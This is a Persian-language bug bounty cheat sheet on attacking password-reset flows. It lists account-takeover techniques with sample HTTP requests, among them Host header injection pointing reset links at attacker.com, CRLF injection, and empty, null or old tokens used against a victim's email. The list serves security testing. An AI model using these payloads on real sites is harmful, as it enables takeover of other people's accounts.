# 11.reset password attack

خیلی از ایده های این بخش از  `[https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5](https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5)` گرفته شده

از توکن خودتون در ایمیل قربانیان استفاده کنید

```
POST /reset
...
...
email=victim@gmail.com&token=$YOUR-TOKEN$
```

Host Header Injection

```
POST /reset
Host: attacker.com
...
email=victim@gmail.com
```

HTML injection in Host Header

```
POST /reset
Host: attacker">.com
...
email=victim@gmail.com
```

Leakage of Password reset in Referer Header

```
Referrer: https://website.com/reset?token=1234
```

استفاده از ایمیل شرکت ها

درحین دعوت از کاربران به حساب/سازمان خود, میتونید ایمیل‌های شرکتی روهم دعوت کنید و یک فیلد جدید "password": "example123" یا "pass": "example123" رو در ریکوئست اضافه کنید. ممکنه در نهایت یک پسورد کاربر رو ریست کنید.

ایمیل های شرکتی رو میتونید در ریپازیتوری های گیت هاب اعضای تارگت پیدا کنید یا میتونید در [http://hunter.io](http://hunter.io/) بررسیش کنید. بعضی از کاربران یک ویژگی برای تعیین پسورد برای ایمیل های دعوت شده دارند، بنابراین در اینجا میتونیم یک پارامتر pass اضافه کنیم.

در صورت موفقیت میتونیم از این اطلاعات کاربری برای ورود به حساب کاربری, Single sign-on integration, پنل‌های پشتیبانی و… استفاده کنیم. #نکات_باگ_بانتی

CRLF in URL

```
با CLRF: /resetPassword?0a%0dHost:attacker.tld (x-host, true-client-ip, x-forwarded...)
```

HTML injection in Email

اسیب پذیری HTML injection در ایمیل از طریق پارامترها, کوکی و… > تزریق تصویر > نشت توکن

توکن رو حذف کنید

```
http://example.com/reset?eamil=victims@gmail.com&token=
```

توکن رو به 0000 تغییر بدید

```
http://example.com/reset?eamil=victims@gmail.com&token=0000000000
```

از مقدار Null استفاده کنید

```
http://example.com/reset?eamil=victims@gmail.com&token=Null/nil
```

ارایه ای از توکن های قدیمی رو امتحان کنید

```
http://example.com/reset?eamil=victims@gmail.com&token=[توکن قدیمی 2, توکن قدیمی 1]
```

بایپس SQLi

بایپس sqli و or ,% ,*  wildcard  رو امتحان کنید

Request Method / Content Type

ریکوئست متود رو به (GET, PUT, POST و…) تغییر بدید و content type رو به (xml<>json)

دستکاری ریسپانس

ریسپانس بد رو با ریسپانس درست حسابی جایگزین کنید

یک توکن گنده

```
http://example.com/reset?email=victims@gmail.com&token=1000000 long string
```

Crossdomain Token Usage

اگر یک اپلیکیشن دارای چندین دامنه با استفاده از مکانیزم ریست پایه هست, ریست پسورد تولید شده از یک دامنه گاهی اوقات در دامنه دیگه هم کار میکنه

نشت ریست توکن در بدنه ریسپانس

یک کاراکترو در ابتدا/پایان تغییر بدید تا ببینید توکن سنجیده شده یا نه

از unicode char jutsu (شبهه حروفی که تشخیصش برای ادم سخت هست) برای جعل ایمیل استفاده کنید

به دنبال race conditions باشید

سعی کنید همون ایمیل رو با TLD های مختلف (eu ,.net. و…) ثبت کنید